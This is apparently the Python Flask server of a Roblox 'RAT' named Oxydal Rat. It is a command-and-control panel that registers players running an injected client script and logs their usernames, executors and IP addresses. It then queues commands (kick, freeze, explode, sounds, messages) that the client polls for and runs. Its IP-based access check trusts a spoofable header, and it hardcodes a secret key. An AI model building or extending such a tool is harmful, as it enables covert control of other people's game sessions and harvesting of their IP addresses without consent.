from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

ALLOWED_IPS = {"37.66.149.36", "91.170.86.224", "127.0.0.1", "::1"}

connected_players = {}
pending_kicks = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return f"""
    <html>
      <body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
        <h1>Accès refusé</h1>
        <p>Ta crue quoi fdp ?</p>
        <p>Ton IP : <b>{detected}</b></p>
      </body>
    </html>
    """, 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

# --- TEMPLATE HTML COMPLET AVEC TOUS LES BOUTONS ---
HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
<style>
    :root { --cyan:#00ffaa; --pink:#ff3366; --purple:#9d00ff; --bg:#0a0e17; }
    * { margin:0; padding:0; box-sizing:border-box; }
    
    /* CORRECTION SCROLL : suppression de overflow:hidden */
    body { 
        font-family:'Rajdhani',sans-serif; 
        background:radial-gradient(circle at top,#0f2027,#000); 
        color:#fff; 
        min-height:100vh; 
        display:flex; 
        overflow-x:hidden; 
        position:relative; 
    }

    canvas { position:fixed; top:0; left:0; z-index:1; opacity:0.35; pointer-events:none; }

    .sidebar { width:280px; background:rgba(10,10,20,0.95); border-right:1px solid #333; padding:30px; z-index:10; backdrop-filter:blur(10px); position:fixed; height:100vh; }
    .sidebar h2 { font-family:'Orbitron',sans-serif; color:var(--cyan); font-size:2rem; text-align:center; margin-bottom:50px; text-shadow:0 0 20px var(--cyan); }

    .nav-btn { background:none; border:none; color:#aaa; padding:18px; text-align:left; font-size:1.3rem; cursor:pointer; border-radius:15px; margin-bottom:15px; transition:all .4s; width:100%; }
    .nav-btn:hover { background:rgba(0,255,170,0.15); color:var(--cyan); transform:translateX(10px); }
    .nav-btn.active { background:rgba(0,255,170,0.2); color:var(--cyan); border-left:5px solid var(--cyan); }

    .main-content { flex:1; margin-left:280px; padding:40px; z-index:5; position:relative; }
    .page { display:none; opacity:0; transition:opacity .6s; }
    .page.active { display:block; opacity:1; }

    h1 { font-family:'Orbitron',sans-serif; font-size:4.5rem; text-align:center; background:linear-gradient(45deg,#00ffaa,#00ffff,#ff00ff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:20px; }

    .stats { text-align:center; font-size:2rem; margin:30px 0; color:var(--cyan); }

    .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(380px,1fr)); gap:30px; }
    .card { background:rgba(20,25,40,0.9); border-radius:20px; padding:28px; border:1px solid rgba(0,255,170,0.3); transition:all .4s; }
    .card:hover { transform:translateY(-10px); box-shadow:0 0 40px rgba(0,255,170,0.3); }

    .dot { width:12px; height:12px; border-radius:50%; display:inline-block; margin-right:5px; background:#ff3366; }
    .dot.online { background:var(--cyan); box-shadow:0 0 10px var(--cyan); }

    /* CORRECTION LIENS */
    .card a { color:#ffcc00; text-decoration:none; font-weight:bold; }
    .card a:hover { text-decoration:underline; }

    button.kick-btn { padding:12px; border:none; border-radius:12px; font-weight:bold; color:white; cursor:pointer; transition:all .2s; margin:4px; font-size:0.8rem; }
    button.kick-btn:hover { transform:scale(1.05); }

    .history-item { background:rgba(30,30,30,0.5); padding:15px; border-radius:10px; margin-bottom:10px; border-left:5px solid #444; display:flex; justify-content:space-between; }
    .history-item.connect { border-color:var(--cyan); }

    .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); align-items:center; justify-content:center; z-index:1000; }
    .modal.active { display:flex; }
    .modal-content { background:#111; padding:30px; border-radius:20px; border:2px solid var(--cyan); width:90%; max-width:450px; }
    input { width:100%; padding:15px; background:#222; border:none; color:white; border-radius:10px; margin:15px 0; }
</style>
</head>
<body>
<canvas id="particles"></canvas>

<div class="sidebar">
    <h2>OXYDAL</h2>
    <button class="nav-btn active" onclick="showPage('playersPage',this)">Players</button>
    <button class="nav-btn" onclick="showPage('historyPage',this)">History</button>
</div>

<div class="main-content">
    <div id="playersPage" class="page active">
        <h1>Oxydal Rat</h1>
        <div class="stats" id="stats">Players online: <b>0</b></div>
        <div class="grid" id="players"></div>
    </div>
    
    <div id="historyPage" class="page">
        <h1>History Logs</h1>
        <div id="historyList"></div>
    </div>
</div>

<div class="modal" id="kickModal">
    <div class="modal-content">
        <h2>Kick Player</h2>
        <input type="text" id="kickReason" placeholder="Reason (ex: ss)">
        <div style="display:flex;gap:10px;">
            <button class="kick-btn" style="background:#444;flex:1;" onclick="closeModal('kickModal')">Cancel</button>
            <button class="kick-btn" style="background:var(--pink);flex:1;" onclick="performKick()">Confirm</button>
        </div>
    </div>
</div>

<div class="modal" id="playSoundModal">
    <div class="modal-content">
        <h2>Play Sound</h2>
        <input type="text" id="soundAssetId" placeholder="Asset ID">
        <button class="kick-btn" style="background:orange;width:100%;" onclick="performPlaySound()">Play</button>
    </div>
</div>

<div class="modal" id="messageModal">
    <div class="modal-content">
        <h2>Display Message</h2>
        <input type="text" id="messageText" placeholder="Message content...">
        <button class="kick-btn" style="background:var(--cyan);color:black;width:100%;" onclick="performMessage()">Send</button>
    </div>
</div>

<script>
    const socket = io();
    let currentId = null;

    // Particules de fond
    const canvas = document.getElementById('particles');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const particles = [];
    for(let i=0;i<60;i++){
        particles.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height, size:Math.random()*3+1, speedX:Math.random()*1-0.5, speedY:Math.random()*1-0.5});
    }
    function animate(){
        ctx.clearRect(0,0,canvas.width,canvas.height);
        particles.forEach(p=>{
            ctx.fillStyle='rgba(0,255,170,0.4)';
            ctx.beginPath(); ctx.arc(p.x,p.y,p.size,0,Math.PI*2); ctx.fill();
            p.x+=p.speedX; p.y+=p.speedY;
            if(p.x<0||p.x>canvas.width) p.speedX*=-1;
            if(p.y<0||p.y>canvas.height) p.speedY*=-1;
        });
        requestAnimationFrame(animate);
    }
    animate();

    function showPage(id, btn){
        document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
        document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        btn.classList.add('active');
    }

    function closeModal(id) { document.getElementById(id).classList.remove('active'); }
    function openKick(id) { currentId = id; document.getElementById('kickModal').classList.add('active'); }
    function openSound(id) { currentId = id; document.getElementById('playSoundModal').classList.add('active'); }
    function openMsg(id) { currentId = id; document.getElementById('messageModal').classList.add('active'); }

    function performKick(){
        const r = document.getElementById("kickReason").value;
        fetch("/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentId,reason:r})});
        closeModal('kickModal');
    }

    function performPlaySound(){
        const sid = document.getElementById("soundAssetId").value;
        sendTroll(currentId, "playsound", sid);
        closeModal('playSoundModal');
    }

    function performMessage(){
        const txt = document.getElementById("messageText").value;
        sendTroll(currentId, "message", txt);
        closeModal('messageModal');
    }

    function sendTroll(id, cmd, asset=null){
        fetch("/troll",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,cmd:cmd,assetId:asset})});
    }

    socket.on("update", data => {
        document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b>`;
        const grid = document.getElementById("players");
        grid.innerHTML = "";
        Object.entries(data.players).forEach(([id, p]) => {
            const card = document.createElement("div");
            card.className = "card";
            card.innerHTML = `
                <div class="status"><div class="dot ${p.online?'online':''}"></div> ${p.online?'Online':'Offline'}</div>
                <div style="margin:10px 0;">
                    <a href="https://www.roblox.com/users/${id}/profile" target="_blank" style="font-size:1.6rem;">${p.username}</a>
                </div>
                <div style="color:#ccc;font-size:0.9rem;margin-bottom:15px;">
                    Executor: ${p.executor}<br>
                    IP: ${p.ip}<br>
                    Game: <a href="https://www.roblox.com/games/${p.gameId || ''}" target="_blank">${p.game}</a>
                </div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:5px;">
                    <button class="kick-btn" style="background:var(--pink);grid-column:span 2;" onclick="openKick('${id}')">KICK</button>
                    <button class="kick-btn" style="background:#8e44ad;" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                    <button class="kick-btn" style="background:#2980b9;" onclick="sendTroll('${id}','spin')">SPIN</button>
                    <button class="kick-btn" style="background:#27ae60;" onclick="sendTroll('${id}','jump')">JUMP</button>
                    <button class="kick-btn" style="background:#f1c40f;color:black;" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                    <button class="kick-btn" style="background:#e67e22;" onclick="openSound('${id}')">SOUND</button>
                    <button class="kick-btn" style="background:#16a085;" onclick="openMsg('${id}')">MESSAGE</button>
                    <button class="kick-btn" style="background:#c0392b;" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                    <button class="kick-btn" style="background:#7f8c8d;" onclick="sendTroll('${id}','invisible')">INVIS</button>
                </div>
                <div style="margin-top:10px;text-align:center;">
                    <button class="kick-btn" style="background:#333;width:100%;" onclick="sendTroll('${id}','unfreeze')">RESET ALL</button>
                </div>
            `;
            grid.appendChild(card);
        });
    });
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        d = request.get_json(silent=True) or {}
        uid = str(d.get("userid", ""))
        if d.get("action") == "register":
            connected_players[uid] = {
                "username": d.get("username", "Unknown"),
                "executor": d.get("executor", "Unknown"),
                "ip": d.get("ip", "Unknown"),
                "last": now,
                "online": True,
                "game": d.get("game", "Unknown"),
                "gameId": d.get("gameId", "")
            }
        elif d.get("action") == "heartbeat" and uid in connected_players:
            connected_players[uid]["last"] = now
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if uid in pending_kicks:
            return jsonify({"command": "kick", "reason": pending_kicks.pop(uid)})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            if isinstance(cmd, dict):
                return jsonify({"command": cmd["cmd"], "assetId": cmd["assetId"]})
            return jsonify({"command": cmd})
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "").strip()
    # Correction logique : si vide -> phrase par défaut, sinon -> ta raison (ex: ss)
    pending_kicks[uid] = reason if reason != "" else "Kicked by Oxydal Rat"
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid, cmd = str(data.get("userid", "")), data.get("cmd", "")
    if uid and cmd:
        if data.get("assetId"):
            pending_commands[uid] = {"cmd": cmd, "assetId": data.get("assetId")}
        else:
            pending_commands[uid] = cmd
    return jsonify({"sent": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30: to_remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_remove: connected_players.pop(uid, None)
        socketio.emit("update", {"players": connected_players, "online": online})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
